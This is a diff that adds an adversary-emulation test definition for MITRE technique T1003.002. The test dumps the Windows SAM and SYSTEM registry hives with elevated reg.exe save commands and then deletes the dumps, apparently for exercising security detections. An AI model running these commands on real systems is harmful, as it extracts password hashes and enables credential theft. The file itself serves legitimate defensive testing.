@@ -1,0 +1,18 @@
+attack_technique: T1003.002
+display_name: "OS Credential Dumping: Security Account Manager"
+atomic_tests:
+- name: Dumping SAM Hive using Reg.exe
+  auto_generated_guid: 76326452-7ef5-4793-ac9b-c81cb68f0d97
+  description: |
+    Dumps SAM and SYSTEM hives using the reg.exe save command.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg.exe save hklm\sam sam.dump
+      reg.exe save hklm\system system.dump
+    cleanup_command: |
+      Remove-Item sam.dump
+      Remove-Item system.dump
+    name: powershell
+    elevation_required: true
